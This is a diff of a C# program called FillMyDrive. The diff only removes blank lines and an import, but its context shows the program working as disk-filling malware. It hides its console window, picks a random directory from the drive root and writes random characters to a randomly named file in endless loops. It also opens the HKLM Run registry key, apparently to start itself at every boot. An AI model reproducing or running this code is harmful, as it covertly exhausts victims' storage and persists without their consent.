@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
 using System.Text;
 using Microsoft.Win32;
@@ -10,15 +9,11 @@ namespace FillMyDrive {
     internal class Program {
         [DllImport( "user32.dll" )]
         private static extern bool ShowWindow( IntPtr hWnd, int nCmdShow );
-
         [DllImport( "Kernel32" )]
         private static extern IntPtr GetConsoleWindow();
-
         private const int SW_HIDE=0;
         private const int SW_SHOW=5;
-
         private const bool Debug = false;
-
         private static void Main( string[] args ) {
             var hwnd = GetConsoleWindow();
             var startUpBool = true;
@@ -30,7 +25,6 @@ namespace FillMyDrive {
             var i2 = 0;
             var directory = new DirectoryInfo( "/" );
             var moreDirs = directory.GetDirectories();
-
             while(true) {
                 i2++;
                 while(i2 > 0) {
@@ -50,18 +44,14 @@ namespace FillMyDrive {
                 directory = new DirectoryInfo( randomDir );
                 if(iRandom == 0) break;
             }
-
             const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" +
                                  "1234567890+*'!\\\"#¤%&/()=?§½@£$€{[]}-_.,:;<>\n\r\t";
-
             var fileName = Path.GetRandomFileName();
-
             if(Debug) {
                 Console.WriteLine( "DEBUG INFO" );
                 Console.WriteLine( "Directory: " + directory.FullName );
                 Console.WriteLine( "File name: " + fileName );
             }
-
             if(File.Exists( directory.FullName + "/" + fileName )) {
                 using(var fs = File.Open( directory.FullName + "/" + fileName, FileMode.Append )) {
                     while(true) {
@@ -73,7 +63,6 @@ namespace FillMyDrive {
                     }
                 }
             }
-
             using(var fs = File.Create( directory.FullName + "/" + fileName )) {
                 while(true) {
                     for(var i = 0; i < Environment.TickCount; i++) {
@@ -84,7 +73,6 @@ namespace FillMyDrive {
                 }
             }
         }
-
         private static void startup( bool add ) {
             var key = Registry.LocalMachine.OpenSubKey( @"Software\Microsoft\Windows\CurrentVersion\Run", true );
             if(add) {
